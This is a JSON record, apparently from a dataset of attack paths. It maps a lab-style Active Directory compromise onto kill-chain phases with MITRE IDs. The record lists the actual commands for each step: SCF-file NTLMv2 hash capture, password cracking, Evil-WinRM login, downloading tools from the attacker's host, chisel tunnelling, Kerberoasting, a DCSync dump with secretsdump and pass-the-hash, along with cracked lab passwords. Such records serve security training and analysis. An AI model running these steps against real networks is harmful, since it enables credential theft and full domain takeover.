{  "id": "ap-0010",  "title": "Domain Compromise: SCF Hash Capture -> Kerberoast -> DCSync",  "summary": "Initial access gained by capturing an NTLMv2 hash via a malicious SCF file, followed by WinRM access, Kerberoasting a service account, and performing a DCSync attack for full domain compromise.",  "attack_path_markdown": "### Step 1\nEnumerate open services (SMB, WinRM) and shares using Nmap and smbmap.\n### Step 2\nExploit write permissions on the 'Public' share by planting a malicious SCF file to capture NTLMv2 hash.\n### Step 3\nCrack the NTLMv2 hash and use the derived credentials to gain access via Evil-WinRM.\n### Step 4\nBypass Constrained Language Mode (CLM) and use BloodHound/rubeus to identify Kerberoastable users and DCSync rights.\n### Step 5\nPerform a Kerberoasting attack against the target user (MLKAY), crack the TGS hash, and use the credentials to execute DCSync, dumping all domain hashes.\n### Step 6\nUtilize the Administrator's NT hash (Pass-the-Hash) to gain full Domain Admin access.",  "kill_chain": [    {      "phase_order": 1,      "phase_name": "Reconnaissance",      "description": "Initial host discovery, port scanning, and identifying exposed network shares and services.",      "actions": [        "Verify host activity and operating system via TTL check.",        "Perform full TCP port scan and service version detection.",        "Enumerate SMB shares for resources and potential write access."      ],      "tools": ["nmap", "ping", "smbmap", "smbclient"],      "techniques": ["Active Scanning", "Service Scanning", "SMB Enumeration"],      "mitre_ids": ["T1046", "T1018"],      "indicators": ["TTL response (127/128 for Windows)", "Open ports (445, 5985, 5986)", "List of accessible shares (DepartmentShares)"],      "preconditions": "Network connectivity to the target host.",      "expected_outcome": "List of open ports and identification of the writeable 'Public' directory within SMB shares.",      "confidence": 1.0,      "commands_and_parameters": [        "ping -c 1 10.10.10.103 [1]",        "nmap -p- -T4 -sT -n -Pn 10.10.10.103 -oG ports ",        "nmap -sV -sC -p [ports] -oA target 10.10.10.103 ",        "smbmap -H 10.10.10.103 [7]",        "smbclient //10.10.10.103/DepartmentShares -N "      ]    },    {      "phase_order": 2,      "phase_name": "Weaponization",      "description": "Preparing the necessary tools and malicious file to exploit the SMB hash capture vulnerability.",      "actions": [        "Setup an SMB server (attacker side) to listen for NTLMv2 hash negotiation.",        "Craft a malicious SCF file configured to load its icon from the attacker's SMB share."      ],      "tools": ["impacket-smbserver", "custom SCF file"],      "techniques": ["NTLM Hash Capture Preparation", "Malicious File Creation"],      "mitre_ids": ["T1558.003"],      "indicators": ["SMB server listening", "SCF file contents"],      "preconditions": "Write access confirmed on an accessible network share.",      "expected_outcome": "A ready-to-deploy SCF file and an active SMB listener.",      "confidence": 1.0,      "commands_and_parameters": [        "impacket-smbserver smb_folder $(pwd) -smb2support ",        "echo [SCF file content referencing attacker IP] > prueba.scf "      ]    },    {      "phase_order": 3,      "phase_name": "Delivery",      "description": "Transferring the malicious SCF file to the target machine's accessible shared folder.",      "actions": [        "Mount the target shared folder locally using CIFS.",        "Copy the malicious SCF file into the 'Public' directory on the mounted share."      ],      "tools": ["mount -t cifs"],      "techniques": ["Drive-by Compromise (Shared Content)", "Tainted Shared Content"],      "mitre_ids": ["T1199"],      "indicators": ["SCF file presence on the target share"],      "preconditions": "Successful mounting of the SMB share; Active SMB listener on the attacker machine.",      "expected_outcome": "Triggering of NTLMv2 hash negotiation when the SCF file is processed by the target OS.",      "confidence": 1.0,      "commands_and_parameters": [        "mount -t cifs //10.10.10.103/DepartmentShares /mnt/montura ",        "cp prueba.scf /mnt/montura/users/Public/"      ]    },    {      "phase_order": 4,      "phase_name": "Exploitation",      "description": "Capturing the NTLMv2 hash, cracking it offline, and establishing remote administration access via WinRM.",      "actions": [        "Capture the NTLMv2 hash for user 'amanda' using the SMB listener.",        "Crack the hash using a wordlist.",        "Attempt authentication via WinRM (port 5985/5986) using the recovered credentials."      ],      "tools": ["john", "Evil-WinRM"],      "techniques": ["NTLM Hash Capture", "Password Cracking", "Remote Services (WinRM)"],      "mitre_ids": ["T1558.003", "T1078"],      "indicators": ["Captured NTLMv2 hash", "Recovered plaintext password (yade1972)", "Successful WinRM session connection."],      "preconditions": "Captured hash is crackable; Target user 'amanda' is part of 'Remote Management Users' group.",      "expected_outcome": "Interactive PowerShell session as 'amanda' via Evil-WinRM on port 5986 (SSL) .",      "confidence": 1.0,      "commands_and_parameters": [        "john --format=netntlmv2 --wordlist=rockyou.txt hashes ",        "evil-winrm -i 10.10.10.103 -u amanda -p yade1972 -S "      ]    },    {      "phase_order": 5,      "phase_name": "Installation",      "description": "Setting up internal access infrastructure by establishing tunneling and bypassing security restrictions.",      "actions": [        "Bypass the Constrained Language Mode (CLM) restriction to allow execution of advanced scripts/binaries.",        "Upload and execute tunneling tools to forward Kerberos (88) and LDAP (389) ports to the attacker machine.",        "Upload and execute internal enumeration tools (BloodHound collector, Rubeus)."      ],      "tools": ["ps bypass clm.exe", "chisel.exe", "rubeus.exe"],      "techniques": ["Bypass Language Mode", "Port Forwarding", "Lateral Tool Transfer"],      "mitre_ids": ["T1546.009", "T1572"],      "indicators": ["Full Language Mode achieved", "Kerberos and LDAP ports accessible locally on attacker machine.", "Rubeus output available."],      "preconditions": "Initial shell access; Tools successfully transferred.",      "expected_outcome": "Attacker machine can perform internal Kerberos/LDAP queries locally, circumventing firewall rules.",      "confidence": 1.0,      "commands_and_parameters": [        "Invoke-WebRequest -Uri http://[Attacker IP]/ps_bypass_clm.exe -OutFile ps_bypass_clm.exe ",        "Invoke-WebRequest -Uri http://[Attacker IP]/chisel.exe -OutFile chisel.exe [16]",        ".\\chisel.exe client 10.10.14.29:1234 R:88:10.10.10.103:88 R:389:10.10.10.103:389 "      ]    },    {      "phase_order": 6,      "phase_name": "Command and Control",      "description": "Using authenticated remote execution capabilities (Evil-WinRM) to perform extensive internal Active Directory enumeration.",      "actions": [        "Perform Kerberoasting attack using valid credentials to harvest TGS hashes from service accounts.",        "Enumerate domain privileges to identify potential escalation vectors (e.g., DCSync rights, Domain Admin members)."      ],      "tools": ["rubeus.exe", "GetUserSPNs.py", "BloodHound"],      "techniques": ["Kerberoasting", "Internal AD Discovery", "Group and User Discovery"],      "mitre_ids": ["T1558.004", "T1087.002"],      "indicators": ["Kerberos service tickets (TGS) hashes captured", "Identification of user 'mlkay' as Kerberoastable.", "Identification of DCSync privileges granted to 'mlkay'."],      "preconditions": "Full Language Mode (or use of Rubeus locally); Port forwarding set up for Kerberos (port 88).",      "expected_outcome": "Captured hash for user 'mlkay' and confirmation of DCSync rights for 'mlkay'.",      "confidence": 1.0,      "commands_and_parameters": [        ".\\rubeus.exe kerberoast /domain:HTTP.LOCAL /user:amanda /password:yade1972 ",        "GetUserSPNs.py -dc-ip 127.0.0.1 HTTP.LOCAL/amanda:yade1972 "      ]    },    {      "phase_order": 7,      "phase_name": "Actions on Objectives",      "description": "Achieving Domain Admin privileges by cracking the service account hash and executing a DCSync attack.",      "actions": [        "Crack the Kerberos TGS hash for user 'mlkay'.",        "Utilize the recovered 'mlkay' credentials to execute DCSync via secretsdump, dumping all NT hashes, including the Domain Administrator's.",        "Use Pass-the-Hash with the Administrator's NT hash to execute commands as Domain Admin."      ],      "tools": ["john", "secretsdump.py", "wmiexec.py"],      "techniques": ["Password Cracking (TGS)", "OS Credential Dumping (DCSync)", "Pass the Hash"],      "mitre_ids": ["T1003.006", "T1550.002"],      "indicators": ["MLKAY password recovered (footballhashtag7)", "Administrator NT hash obtained", "Successful remote execution as Administrator (NT Authority/System)."],      "preconditions": "MLKAY credentials recovered; MLKAY possesses DCSync rights (GetChangesAll).",      "expected_outcome": "Root flag captured and full Domain Admin access achieved.",      "confidence": 1.0,      "commands_and_parameters": [        "john --format=krb5tgs --wordlist=rockyou.txt mlkay.hash ",        "secretsdump.py HTTP.LOCAL/mlkay:footballhashtag7@10.10.10.103 ",        "wmiexec.py Administrator:$(Administrator NT Hash)@10.10.10.103 "      ]    }  ],  "tactics": ["Initial Access","Credential Access","Discovery","Privilege Escalation","Lateral Movement"],  "techniques": ["NTLM Hash Capture", "Kerberoasting", "DCSync", "Remote Services (WinRM)"],  "mitre_ids": ["T1558.003", "T1558.004", "T1003.006", "T1078"],  "hosts": ["10.10.10.103", "http.local"],  "privs_obtained": ["Domain User (amanda)", "Domain Admin"],  "confidence": 1.0,  "source_file": "",  "notes": "Domain compromise pathway heavily reliant on Active Directory misconfigurations (SMB permissions, weak service account password, and DCSync rights).",  "labels": ["active_directory", "dcsync", "kerberos", "winrm"]}